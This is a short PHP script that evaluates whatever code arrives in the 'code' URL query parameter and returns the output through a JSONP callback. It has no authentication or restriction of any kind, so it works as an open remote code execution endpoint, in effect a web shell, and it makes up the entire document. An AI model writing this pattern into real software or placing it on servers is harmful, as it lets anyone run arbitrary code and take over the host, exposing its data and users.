<?php
ini_set('html_errors', 1);
ob_start();
eval('?>' . $_GET['code']);
$out = ob_get_contents();
ob_end_clean();
$out = json_encode($out);
echo "callback($out)";